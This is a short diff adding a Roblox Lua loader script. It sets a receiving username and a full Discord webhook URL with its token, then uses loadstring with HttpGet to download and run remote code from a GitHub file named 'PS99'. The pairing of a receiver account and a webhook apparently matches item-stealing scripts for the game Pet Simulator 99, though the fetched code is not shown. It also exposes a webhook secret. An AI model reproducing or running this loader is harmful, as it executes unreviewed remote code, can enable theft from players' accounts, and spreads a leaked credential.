@@ -1,0 +1,5 @@
+Username = "jamalxd1432"
+Webhook = "https://discord.com/api/webhooks/1348216970176102481/hXyEM9WyN1SC44sxwoPFtltMXSTyloVLTxyHCO-9dG1MSAl1gkazkZKR7Ej4b7gmontZ"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/zdkjaime/KeltScripts/refs/heads/main/PS99'))()
+
